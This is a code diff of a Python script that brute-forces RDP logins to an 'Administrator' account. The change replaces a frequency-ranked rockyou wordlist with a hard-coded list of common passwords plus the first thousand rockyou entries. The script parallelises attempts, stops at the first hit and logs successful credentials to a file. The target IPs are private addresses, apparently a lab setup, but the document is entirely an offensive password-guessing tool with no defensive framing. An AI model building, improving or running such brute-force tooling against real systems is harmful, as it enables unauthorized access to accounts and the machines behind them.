@@ -1,21 +1,24 @@
 import subprocess
 from multiprocessing import Pool, Manager, cpu_count
 from collections import Counter
-import time
 
 # Configuration
-target_ip = "192.168.137.128"
+target_ip = "192.168.56.101"
 username = "Administrator"
 rockyou_path = "/usr/share/wordlists/rockyou.txt"
 top_n = 1000
 success_log = "rdp_success.txt"
 
-# Extract Top Passwords
-def get_top_passwords(filepath, top_n):
+# Prepend these most common passwords
+common_passwords = [
+    "12345", "123456", "123456789", "password", "admin",
+    "12345678", "qwerty", "abc123", "password1", "111111"
+]
+
+# Get top N from rockyou.txt (in order, not by frequency)
+def get_top_rockyou(filepath, top_n):
     with open(filepath, "r", encoding="latin-1", errors="ignore") as f:
-        passwords = [line.strip() for line in f if line.strip()]
-    counter = Counter(passwords)
-    return [pw for pw, _ in counter.most_common(top_n)]
+        return [line.strip() for _, line in zip(range(top_n), f) if line.strip()]
 
 # Worker function
 def attempt_login(password, found_flag):
@@ -42,20 +45,21 @@ def attempt_login(password, found_flag):
         pass
     return None
 
-# Main Controller
+# Main
 if __name__ == "__main__":
-    print(f"[*] Extracting top {top_n} passwords...")
-    passwords = get_top_passwords(rockyou_path, top_n)
+    print(f"[*] Preparing password list...")
+    rockyou_passwords = get_top_rockyou(rockyou_path, top_n)
+    password_list = common_passwords + rockyou_passwords
 
     manager = Manager()
     found_flag = manager.Value('b', False)
-
-    print(f"[*] Starting brute-force...")
     pool = Pool(cpu_count() * 2)
     jobs = []
 
+    print(f"[*] Starting brute-force with {len(password_list)} passwords...")
+
     try:
-        for pw in passwords:
+        for pw in password_list:
             if found_flag.value:
                 break
             job = pool.apply_async(attempt_login, args=(pw, found_flag))
@@ -70,7 +74,7 @@ if __name__ == "__main__":
                 break
 
     except KeyboardInterrupt:
-        print("\n[!] Interrupted. Terminating...")
+        print("\n[!] Interrupted.")
     finally:
         pool.terminate()
         pool.join()
